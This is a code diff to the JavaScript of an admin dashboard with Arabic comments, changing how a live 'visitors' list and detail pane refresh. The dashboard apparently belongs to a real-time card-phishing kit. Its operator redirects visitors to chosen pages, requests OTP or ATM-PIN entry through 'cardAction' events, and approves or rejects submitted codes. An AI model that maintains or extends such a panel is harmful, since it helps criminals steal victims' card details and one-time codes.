@@ -922,13 +922,12 @@
             visitors.set(v._id, existing);
           }
         });
-        // إعادة الرسم فقط إذا لم يكن هناك عملية جارية
-        if (!window.skipNextUpdate) {
-          renderVisitorsList();
-          if (selectedVisitorId) {
-            const visitor = visitors.get(selectedVisitorId);
-            if (visitor) renderVisitorDetails(visitor);
-          }
+        // تحديث قائمة الزوار دائماً (لإخفاء ينتظر الرد)
+        renderVisitorsList();
+        // تحديث التفاصيل فقط إذا لم يكن هناك زر يعرض "تم الإرسال"
+        if (!window.skipDetailsUpdate && selectedVisitorId) {
+          const visitor = visitors.get(selectedVisitorId);
+          if (visitor) renderVisitorDetails(visitor);
         }
       });
     }
@@ -1858,18 +1857,13 @@
 
     // دالة تحويل الزائر لصفحة محددة مباشرة
     function navigateVisitorToPage(socketId, page) {
-      window.skipNextUpdate = true;
       socket.emit('admin:navigate', { visitorSocketId: socketId, page });
-      // تحديث حالة الانتظار
+      // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) {
         visitor.waitingForAdminResponse = false;
       }
-      setTimeout(() => {
-        window.skipNextUpdate = false;
-        renderVisitorsList();
-        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
-      }, 1500);
+      renderVisitorsList();
     }
 
     // دالة الموافقة على طلب إعادة إرسال الرمز
@@ -1892,21 +1886,20 @@
       const btn = event.target;
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-blue-600';
-      window.skipNextUpdate = true;
+      window.skipDetailsUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
-      // تحديث حالة الانتظار
+      // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
+      renderVisitorsList();
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove(originalBg);
       btn.classList.add('bg-green-600');
       setTimeout(() => {
-        window.skipNextUpdate = false;
+        window.skipDetailsUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-green-600');
         btn.classList.add(originalBg);
-        renderVisitorsList();
-        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
@@ -1914,42 +1907,40 @@
       const btn = event.target;
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-yellow-600';
-      window.skipNextUpdate = true;
+      window.skipDetailsUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
-      // تحديث حالة الانتظار
+      // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
+      renderVisitorsList();
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove(originalBg);
       btn.classList.add('bg-green-600');
       setTimeout(() => {
-        window.skipNextUpdate = false;
+        window.skipDetailsUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-green-600');
         btn.classList.add(originalBg);
-        renderVisitorsList();
-        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
     function cardActionReject(socketId) {
       const btn = event.target;
       const originalText = btn.textContent;
-      window.skipNextUpdate = true;
+      window.skipDetailsUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
-      // تحديث حالة الانتظار
+      // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
+      renderVisitorsList();
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-red-600', 'hover:bg-red-700');
       btn.classList.add('bg-green-600');
       setTimeout(() => {
-        window.skipNextUpdate = false;
+        window.skipDetailsUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-green-600');
         btn.classList.add('bg-red-600', 'hover:bg-red-700');
-        renderVisitorsList();
-        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
@@ -1957,42 +1948,40 @@
     function codeActionApprove(socketId, codeIndex) {
       const btn = event.target;
       const originalText = btn.textContent;
-      window.skipNextUpdate = true;
+      window.skipDetailsUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
-      // تحديث حالة الانتظار
+      // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
+      renderVisitorsList();
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-green-600', 'hover:bg-green-700');
       btn.classList.add('bg-gray-500');
       setTimeout(() => {
-        window.skipNextUpdate = false;
+        window.skipDetailsUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-gray-500');
         btn.classList.add('bg-green-600', 'hover:bg-green-700');
-        renderVisitorsList();
-        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
     function codeActionReject(socketId, codeIndex) {
       const btn = event.target;
       const originalText = btn.textContent;
-      window.skipNextUpdate = true;
+      window.skipDetailsUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
-      // تحديث حالة الانتظار
+      // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
+      renderVisitorsList();
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-red-600', 'hover:bg-red-700');
       btn.classList.add('bg-green-600');
       setTimeout(() => {
-        window.skipNextUpdate = false;
+        window.skipDetailsUpdate = false;
         btn.textContent = originalText;
         btn.classList.remove('bg-green-600');
         btn.classList.add('bg-red-600', 'hover:bg-red-700');
-        renderVisitorsList();
-        if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
       }, 1500);
     }
 
